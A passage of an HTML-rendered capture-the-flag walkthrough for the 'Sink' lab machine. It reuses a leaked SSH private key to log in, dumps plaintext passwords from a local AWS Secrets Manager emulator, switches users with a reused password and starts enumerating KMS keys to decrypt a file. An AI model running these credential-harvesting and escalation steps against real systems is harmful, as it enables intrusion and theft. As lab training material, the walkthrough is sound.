</span><span style="color:#f1fa8c">P8KszjbluPIfVgf4HjZFCedQnQywyPweNp8YG2YF1K5gdHr52HDhNgntqnUyR0zXp5eQXD
</span><span style="color:#f1fa8c">tc5sOZYpVI9srks+3zSZ22I3jkmA8CM8/o94KZ19Wamv2vNrK/bpzoDIdGPCvWW6TH2pEn
</span><span style="color:#f1fa8c">gehhV6x3HdYoYKlfFEHKjhN7uxX/A3Bbvve3K1l+6uiDMIGTTlgDHWeHk1mi9SlO5YlcXE
</span><span style="color:#f1fa8c">u6pkBMOwMcZpIjCBWRqSOwlD7/DN7RydtObSEF3dNAZeu2tU29PDLusXcd9h0hQKxZ019j
</span><span style="color:#f1fa8c">8T0UB92PO+kUjwsEN0hMBGtUp6ceyCH3xzoy+0Ka7oSDgU59ykJcYh7IRNP+fbnLZvggZj
</span><span style="color:#f1fa8c">DmmLxZqnXzWbZUT0u2V1yG/pwvBQ8FAcR/PBnli3us2UAjRmV8D5/ya42Yr1gnj6bBAAAA
</span><span style="color:#f1fa8c">wDdnyIt/T1MnbQOqkuyuc+KB5S9tanN34Yp1AIR3pDzEznhrX49qA53I9CSZbE2uce7eFP
</span><span style="color:#f1fa8c">MuTtRkJO2d15XVFnFWOXzzPI/uQ24KFOztcOklHRf+g06yIG/Y+wflmyLb74qj+PHXwXgv
</span><span style="color:#f1fa8c">EVhqJdfWQYSywFapC40WK8zLHTCv49f5/bh7kWHipNmshMgC67QkmqCgp3ULsvFFTVOJpk
</span><span style="color:#f1fa8c">jzKyHezk25gIPzpGvbIGDPGvsSYTdyR6OV6irxxnymdXyuFwAAAMEA9PN7IO0gA5JlCIvU
</span><span style="color:#f1fa8c">cs5Vy/gvo2ynrx7Wo8zo4mUSlafJ7eo8FtHdjna/eFaJU0kf0RV2UaPgGWmPZQaQiWbfgL
</span><span style="color:#f1fa8c">k4hvz6jDYs9MNTJcLg+oIvtTZ2u0/lloqIAVdL4cxj5h6ttgG13Vmx2pB0Jn+wQLv+7HS6
</span><span style="color:#f1fa8c">7OZcmTiiFwvO5yxahPPK14UtTsuJMZOHqHhq2kH+3qgIhU1yFVUwHuqDXbz+jvhNrKHMFu
</span><span style="color:#f1fa8c">BE4OOnSq8vApFv4BR9CSJxsxEeKvRPAAAAwQDPH0OZ4xF9A2IZYiea02GtQU6kR2EndmQh
</span><span style="color:#f1fa8c">nz6oYDU3X9wwYmlvAIjXAD9zRbdE7moa5o/xa/bHSAHHr+dlNFWvQn+KsbnAhIFfT2OYvb
</span><span style="color:#f1fa8c">TyVkiwpa8uditQUeKU7Q7e7U5h2yv+q8yxyJbt087FfUs/dRLuEeSe3ltcXsKjujvObGC1
</span><span style="color:#f1fa8c">H6wje1uuX+VDZ8UB7lJ9HpPJiNawoBQ1hJfuveMjokkN2HR1rrEGHTDoSDmcVPxmHBWsHf
</span><span style="color:#f1fa8c">5UiCmudIHQVhEAAAANbWFyY3VzQHVidW50dQECAwQFBg==
</span><span style="color:#f1fa8c">-----END OPENSSH PRIVATE KEY-----&#34;</span> &gt;&gt; id_private.sink.htb

chmod <span style="color:#bd93f9">600</span> id_private.sink.htb

ssh -i id_private.sink.htb marcus@10.10.10.225
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
marcus@sink:~$ cat user.txt
f7f2be43788b0d0cc234559743bd7be9
</code></pre></td></tr></table>
</div>
</div><h1 id="exploration-as-marcus">Exploration as marcus</h1>
<p>This machine runs many docker containers, but one in particular is <a href="https://github.com/localstack/localstack">localStack</a> which allows testing locally an AWS cloud.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ps -auxx --forest
ps -auxx| grep stack
</code></pre></td></tr></table>
</div>
</div><p>Enumerating aws commands with <code>aws[TAB][TAB]</code>, we find <code>aws</code> and <code>awslocal</code> (same as aws but for localhost only =&gt; no need to specify the &ndash;endpoint-url)</p>
<h1 id="shell-as-david">Shell as David</h1>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">awslocal secretsmanager list-secrets | grep Name | cut -d<span style="color:#f1fa8c">&#39;&#34;&#39;</span> -f4
Jenkins Login
Sink Panel
Jira Support
</code></pre></td></tr></table>
</div>
</div><p>We can explore secrets with <code>awslocal secretsmanager get-secret-value help</code></p>
<pre tabindex="0"><code>       --secret-id (string)
          Specifies  the  secret  containing  the version that you want to re-
          trieve. You can specify either the Amazon Resource Name (ARN) or the
          friendly name of the secret.
</code></pre><p>We can get the 3 secret values:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">marcus@sink:~$ awslocal secretsmanager get-secret-value --secret-id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Jenkins Login&#34;</span>
<span style="color:#ff79c6">{</span>
    <span style="color:#f1fa8c">&#34;ARN&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:secretsmanager:us-east-1:1234567890㊙️Jenkins Login-uoWvE&#34;</span>,
    <span style="color:#f1fa8c">&#34;Name&#34;</span>: <span style="color:#f1fa8c">&#34;Jenkins Login&#34;</span>,
    <span style="color:#f1fa8c">&#34;VersionId&#34;</span>: <span style="color:#f1fa8c">&#34;8f4f3ae3-541b-478e-a39e-c1d101afc726&#34;</span>,
    <span style="color:#f1fa8c">&#34;SecretString&#34;</span>: <span style="color:#f1fa8c">&#34;{\&#34;username\&#34;:\&#34;john@sink.htb\&#34;,\&#34;password\&#34;:\&#34;R);\\)ShS99mZ~8j\&#34;}&#34;</span>,
    <span style="color:#f1fa8c">&#34;VersionStages&#34;</span>: <span style="color:#ff79c6">[</span>
        <span style="color:#f1fa8c">&#34;AWSCURRENT&#34;</span>
    <span style="color:#ff79c6">]</span>,
    <span style="color:#f1fa8c">&#34;CreatedDate&#34;</span>: <span style="color:#bd93f9">1631958273</span>
<span style="color:#ff79c6">}</span>
marcus@sink:~$ awslocal secretsmanager get-secret-value --secret-id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Sink Panel&#34;</span>
<span style="color:#ff79c6">{</span>
    <span style="color:#f1fa8c">&#34;ARN&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:secretsmanager:us-east-1:1234567890㊙️Sink Panel-AfneJ&#34;</span>,
    <span style="color:#f1fa8c">&#34;Name&#34;</span>: <span style="color:#f1fa8c">&#34;Sink Panel&#34;</span>,
    <span style="color:#f1fa8c">&#34;VersionId&#34;</span>: <span style="color:#f1fa8c">&#34;ed7ce089-1ebc-471c-9289-67cea245f297&#34;</span>,
    <span style="color:#f1fa8c">&#34;SecretString&#34;</span>: <span style="color:#f1fa8c">&#34;{\&#34;username\&#34;:\&#34;albert@sink.htb\&#34;,\&#34;password\&#34;:\&#34;Welcome123!\&#34;}&#34;</span>,
    <span style="color:#f1fa8c">&#34;VersionStages&#34;</span>: <span style="color:#ff79c6">[</span>
        <span style="color:#f1fa8c">&#34;AWSCURRENT&#34;</span>
    <span style="color:#ff79c6">]</span>,
    <span style="color:#f1fa8c">&#34;CreatedDate&#34;</span>: <span style="color:#bd93f9">1631958273</span>
<span style="color:#ff79c6">}</span>
marcus@sink:~$ awslocal secretsmanager get-secret-value --secret-id<span style="color:#ff79c6">=</span><span style="color:#f1fa8c">&#34;Jira Support&#34;</span>
<span style="color:#ff79c6">{</span>
    <span style="color:#f1fa8c">&#34;ARN&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:secretsmanager:us-east-1:1234567890㊙️Jira Support-dbgjQ&#34;</span>,
    <span style="color:#f1fa8c">&#34;Name&#34;</span>: <span style="color:#f1fa8c">&#34;Jira Support&#34;</span>,
    <span style="color:#f1fa8c">&#34;VersionId&#34;</span>: <span style="color:#f1fa8c">&#34;092983a7-5dc0-424a-9749-bc2a19e1673a&#34;</span>,
    <span style="color:#f1fa8c">&#34;SecretString&#34;</span>: <span style="color:#f1fa8c">&#34;{\&#34;username\&#34;:\&#34;david@sink.htb\&#34;,\&#34;password\&#34;:\&#34;EALB=bcC=`a7f2#k\&#34;}&#34;</span>,
    <span style="color:#f1fa8c">&#34;VersionStages&#34;</span>: <span style="color:#ff79c6">[</span>
        <span style="color:#f1fa8c">&#34;AWSCURRENT&#34;</span>
    <span style="color:#ff79c6">]</span>,
    <span style="color:#f1fa8c">&#34;CreatedDate&#34;</span>: <span style="color:#bd93f9">1631958273</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Last secret is david Jira Support&rsquo;s password, but we are lucky as it is also his login password:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">marcus@sink:~$ su david -
Password:
david@sink:/home/marcus$ <span style="color:#8be9fd;font-style:italic">cd</span> ~
</code></pre></td></tr></table>
</div>
</div><h1 id="shell-as-root">Shell as root</h1>
<p>We can find an encrypted file:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">david@sink:~$ ls
Projects
david@sink:~$ find Projects/ -type f -ls
   <span style="color:#bd93f9">393219</span>      <span style="color:#bd93f9">4</span> -rw-r--r--   <span style="color:#bd93f9">1</span> david    david         <span style="color:#bd93f9">512</span> Jan <span style="color:#bd93f9">22</span> 19:58 Projects/Prod_Deployment/servers.enc
</code></pre></td></tr></table>
</div>
</div><p>We know it is encrypted because neither <code>file</code> or <code>xxd</code> can help figure out what it is and the extension is <code>enc</code></p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">david@sink:~$ <span style="color:#8be9fd;font-style:italic">cd</span> ~/Projects/Prod_Deployment/
david@sink:~/Projects/Prod_Deployment$ file ./servers.enc
./servers.enc: data
david@sink:~/Projects/Prod_Deployment$ xxd servers.enc
00000000: <span style="color:#bd93f9">9973</span> 2cfb c64b 129f 64ac 62cb 253d 981c  .s,..K..d.b.%<span style="color:#ff79c6">=</span>..
<span style="color:#ff79c6">[</span>..<span style="color:#ff79c6">]</span>
000001f0: 9a2f 3f37 8f4c a783 4d1d 2aa2 c5bf 189f  ./?7.L..M.*.....
</code></pre></td></tr></table>
</div>
</div><p>Maybe a KMS key can help recover the content? Let&rsquo;s list them all:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">awslocal kms list-keys
<span style="color:#ff79c6">{</span>
    <span style="color:#f1fa8c">&#34;Keys&#34;</span>: <span style="color:#ff79c6">[</span>
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;0b539917-5eff-45b2-9fa1-e13f0d2c42ac&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/0b539917-5eff-45b2-9fa1-e13f0d2c42ac&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;16754494-4333-4f77-ad4c-d0b73d799939&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/16754494-4333-4f77-ad4c-d0b73d799939&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;2378914f-ea22-47af-8b0c-8252ef09cd5f&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/2378914f-ea22-47af-8b0c-8252ef09cd5f&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;2bf9c582-eed7-482f-bfb6-2e4e7eb88b78&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/2bf9c582-eed7-482f-bfb6-2e4e7eb88b78&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;53bb45ef-bf96-47b2-a423-74d9b89a297a&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/53bb45ef-bf96-47b2-a423-74d9b89a297a&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;804125db-bdf1-465a-a058-07fc87c0fad0&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/804125db-bdf1-465a-a058-07fc87c0fad0&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;837a2f6e-e64c-45bc-a7aa-efa56a550401&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/837a2f6e-e64c-45bc-a7aa-efa56a550401&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;881df7e3-fb6f-4c7b-9195-7f210e79e525&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/881df7e3-fb6f-4c7b-9195-7f210e79e525&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;c5217c17-5675-42f7-a6ec-b5aa9b9dbbde&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/c5217c17-5675-42f7-a6ec-b5aa9b9dbbde&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;f0579746-10c3-4fd1-b2ab-f312a5a0f3fc&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/f0579746-10c3-4fd1-b2ab-f312a5a0f3fc&#34;</span>
        <span style="color:#ff79c6">}</span>,
        <span style="color:#ff79c6">{</span>
            <span style="color:#f1fa8c">&#34;KeyId&#34;</span>: <span style="color:#f1fa8c">&#34;f2358fef-e813-4c59-87c8-70e50f6d4f70&#34;</span>,
            <span style="color:#f1fa8c">&#34;KeyArn&#34;</span>: <span style="color:#f1fa8c">&#34;arn:aws:kms:us-east-1:000000000000:key/f2358fef-e813-4c59-87c8-70e50f6d4f70&#34;</span>
        <span style="color:#ff79c6">}</span>
    <span style="color:#ff79c6">]</span>
<span style="color:#ff79c6">}</span>
</code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s examine a key:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
